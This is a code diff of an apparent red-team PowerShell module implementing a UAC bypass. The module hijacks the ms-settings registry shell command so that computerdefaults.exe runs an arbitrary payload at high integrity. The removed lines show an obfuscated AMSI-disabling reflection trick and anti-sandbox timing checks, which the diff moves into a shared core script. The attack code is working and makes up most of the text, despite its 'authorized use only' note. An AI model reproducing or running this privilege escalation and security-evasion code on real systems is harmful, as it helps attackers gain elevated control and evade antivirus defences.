@@ -45,17 +45,11 @@
 .PARAMETER Payload
     Command to execute with High integrity.
 
-.PARAMETER SkipAMSI
-    Skip AMSI mitigation.
-
-.PARAMETER SkipChecks
-    Skip preflight environment checks.
-
 .PARAMETER Timeout
     Seconds to wait before cleanup (default: 4).
 
 .EXAMPLE
-    Invoke-ComputerDefaultsBypass -Payload "cmd.exe" -SkipChecks
+    Invoke-ComputerDefaultsBypass -Payload "cmd.exe"
 
 .EXAMPLE
     $cmd = "powershell.exe -NoP -W Hidden -C `"whoami | Out-File C:\T\r.txt`""
@@ -63,8 +57,10 @@
 
 .NOTES
     Authorized red/purple-team use only.  Requires written SOW.
-    computerdefaults.exe minimum build: 17134 (RS4 / April 2018 Update).
+    Minimum build: 17134 (RS4 / April 2018 Update).
     On builds < 17134, use Invoke-FodHelperBypass instead.
+    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
+    AMSI mitigation and preflight checks.
 #>
 
 [CmdletBinding(SupportsShouldProcess)]
@@ -73,81 +69,21 @@ param(
     [ValidateNotNullOrEmpty()]
     [string]$Payload,
 
-    [switch]$SkipAMSI,
-    [switch]$SkipChecks,
-    [int]   $Timeout = 4
+    [int]$Timeout = 4
 )
 
 Set-StrictMode -Off
 $ErrorActionPreference = 'SilentlyContinue'
 
-#region ── AMSI mitigation ───────────────────────────────────────────────────
-if (-not $SkipAMSI) {
-    try {
-        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
-                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
-                  Select-Object -First 1
-        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
-        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
-        $xF.SetValue($null, $true)
-    } catch {}
-}
-#endregion
-
-#region ── Preflight gate ────────────────────────────────────────────────────
-if (-not $SkipChecks) {
-
-    # Build check — minimum RS4 (17134)
-    try {
-        $xBld = [int](Get-ItemPropertyValue `
-                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
-                    'CurrentBuildNumber' -EA Stop)
-    } catch { $xBld = [Environment]::OSVersion.Version.Build }
-    if ($xBld -lt 17134) {
-        Write-Warning "[CompDef] Requires build 17134+ (RS4). Current: $xBld. Use Invoke-FodHelperBypass instead."
-        return
-    }
-
-    # Admin check
-    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
-                      [Security.Principal.WindowsIdentity]::GetCurrent())
-    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Warning '[CompDef] Already elevated — no bypass needed.'
-        return
-    }
-
-    # UAC policy
-    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
-    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
-    catch { $xBeh = 5 }
-    if ($xBeh -le 2) {
-        Write-Warning "[CompDef] AlwaysNotify active (behavior=$xBeh) — method requires default UAC."
-        return
-    }
-
-    # Timing / anti-sandbox
-    $xH = [System.Security.Cryptography.SHA256]::Create()
-    $xB = [byte[]]::new(65536)
-    $xT0 = [DateTime]::UtcNow
-    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
-    $xH.Dispose()
-    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
-        Write-Warning '[CompDef] Timing anomaly — aborting.'
-        return
-    }
+#region ── Core loader (for registry helpers) ────────────────────────────────
+if (-not (Get-Command 'Set-ShellClassCommand' -ErrorAction SilentlyContinue)) {
+    . "$PSScriptRoot\..\Core\Invoke-UACCore.ps1"
 }
 #endregion
 
 #region ── Registry key setup ────────────────────────────────────────────────
-$xRoot  = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
-$xCls   = 'ms-set' + 'tings'
-$xPath  = $xRoot + $xCls + '\Shell\Open\command'
-
 try {
-    New-Item -Path $xPath -Force | Out-Null
-    Set-ItemProperty  -Path $xPath -Name '(Default)'       -Value $Payload -Force
-    New-ItemProperty  -Path $xPath -Name 'DelegateExecute' -Value ''       `
-                      -PropertyType String -Force | Out-Null
+    Set-ShellClassCommand -ClassKey ('ms-set' + 'tings') -Payload $Payload
     Write-Verbose '[CompDef] Registry key written.'
 }
 catch {
@@ -168,7 +104,7 @@ catch {
     Write-Warning "[CompDef] Launch failed: $_"
 }
 finally {
-    Remove-Item -Path ($xRoot + $xCls) -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-ShellClassKey -ClassKey ('ms-set' + 'tings')
     Write-Verbose '[CompDef] Registry cleanup complete.'
 }
 #endregion
